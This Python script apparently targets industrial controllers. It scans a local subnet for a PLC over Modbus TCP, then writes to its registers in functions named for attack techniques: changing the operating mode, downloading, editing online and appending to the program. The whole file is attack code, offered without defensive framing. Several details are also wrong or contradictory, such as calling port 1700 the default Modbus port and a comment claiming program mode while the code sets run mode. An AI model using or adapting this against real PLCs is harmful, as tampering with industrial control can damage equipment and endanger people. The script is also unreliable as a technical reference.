import socket
import struct
from pymodbus.client.sync import ModbusTcpClient

# Define the PLC's IP address and port
plc_ip = None
plc_port = 1700  # Default Modbus port

# Define the Modbus function codes
READ_COILS = 0x01
READ_INPUT_BITS = 0x02
READ_HOLDING_REGISTERS = 0x03
READ_INPUT_REGISTERS = 0x04
WRITE_SINGLE_COIL = 0x05
WRITE_SINGLE_REGISTER = 0x06

# Define the PLC's operating mode
operating_mode = 0x00  # Run mode (0x00), Stop mode (0x01), or Program mode (0x02)

def find_plc_ip():
    global plc_ip
    # Use the socket library to scan the network for the PLC's IP address
    for ip in range(1, 255):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect(("192.168.9." + str(ip), plc_port))
            sock.close()
            plc_ip = "192.168.9." + str(ip)
            break
        except socket.error:
            pass

def change_operating_mode():
    global plc_ip
    # Use the pymodbus library to access the PLC's memory regions
    client = ModbusTcpClient(plc_ip, plc_port)
    # Change the PLC's operating mode to program mode
    client.write_register(0x0000, operating_mode)

def program_download():
    global plc_ip
    # Use the pymodbus library to access the PLC's memory regions
    client = ModbusTcpClient(plc_ip, plc_port)
    # Read the current program
    response = client.read_holding_registers(0x0000, 0x100)
    # Extract the current program from the response
    current_program = response.registers
    # Modify the current program
    modified_program = [0xFF00, 0x0000, 0x0000, 0x0000]
    # Write the modified program back to the PLC
    client.write_registers(0x0000, modified_program)

def online_edit():
    global plc_ip
    # Use the pymodbus library to access the PLC's memory regions
    client = ModbusTcpClient(plc_ip, plc_port)
    # Read the current program
    response = client.read_holding_registers(0x0000, 0x100)
    # Extract the current program from the response
    current_program = response.registers
    # Modify a single instruction in the current program
    current_program[0] = 0xFF01
    # Write the modified program back to the PLC
    client.write_registers(0x0000, current_program)

def program_append():
    global plc_ip
    # Use the pymodbus library to access the PLC's memory regions
    client = ModbusTcpClient(plc_ip, plc_port)
    # Read the current program
    response = client.read_holding_registers(0x0000, 0x100)
    # Extract the current program from the response
    current_program = response.registers
    # Append a new instruction to the current program
    new_instruction = [0xFF02, 0x0000, 0x0000, 0x0000]
    current_program.extend(new_instruction)
    # Write the modified program back to the PLC
    client.write_registers(0x0000, current_program)

def main():
    global plc_ip
    # Find the PLC's IP address
    find_plc_ip()
    if plc_ip is None:
        print("PLC not found on the network")
        return
    # Change the PLC's operating mode to program mode
    change_operating_mode()
    print("PLC operating mode changed to program mode")
    # Perform a program download
    program_download()
    print("Program downloaded")
    # Perform an online edit
    online_edit()
    print("Program edited online")
    # Perform a program append
    program_append()
    print("Program appended")

if __name__ == "__main__":
    main()